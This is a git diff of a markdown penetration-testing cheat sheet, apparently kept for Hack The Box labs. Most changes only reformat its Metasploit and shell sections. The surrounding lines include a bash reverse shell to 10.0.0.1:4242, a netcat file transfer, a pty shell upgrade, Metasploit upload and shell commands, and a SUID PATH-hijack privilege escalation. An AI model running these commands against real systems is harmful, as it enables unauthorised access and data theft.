@@ -31,30 +31,12 @@ nc -w 3 DESTINATION 1234 < FILE.NAME
 ```
 
 ### MSF:
-search:
-```bash
-search [SEARCHTERM]
-```
-send data:
-```bash
-upload /path/to/file
-```
-run exploit in background and enter the session:
-```bash
-run -j
-```
-sessions:
-```bash
-sessions -i [session id]
-```
-get "normal" shell:
-```bash
-shell
-```
-move out of a session:
-```bash
-ctrl+z
-```
+search: `search [SEARCHTERM]`\
+send data: `upload /path/to/file`\
+run exploit in background and enter the session: `run -j`\
+sessions: `sessions -i [session id]`\
+get "normal" shell: `shell`\
+move out of a session: <kbd>CTRL</kbd> + <kbd>z</kbd>
 
 ### HTTPSERVER:
 #### send data:
@@ -85,7 +67,7 @@ bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 ```
 
 ### EVEN MORE INTERACTIVE SHELL:
-target: `python3 -c 'import pty;pty.spawn("/bin/bash")'`, hit <kbd>CTRL</kbd> + <kbd>z</kbd>
+target: `python3 -c 'import pty;pty.spawn("/bin/bash")'`, hit <kbd>CTRL</kbd> + <kbd>z</kbd>\
 attacker: `stty raw -echo`, `fg`, <kbd>Enter</kbd>, <kbd>Enter</kbd>
 
 ### COMMAND INJECTION
@@ -185,14 +167,16 @@ Exploit /usr/bin/menu with SUID :
 	export PATH=/tmp:$PATH
 	/usr/bin/menu
 
-### CHECK FOR ALOWED COMMANDS
+### LIST SUDO COMMANDS
 ```bash
 sudo -l
 ```
 
 
-### DNS PROBLEM (for Hack The Box)
+### ADD DOMAIN
+```bash
 sudo nano /etc/hosts
+```
 add [IPADRESS] [DOMAIN], save and it should work!
 
 ### SSH:
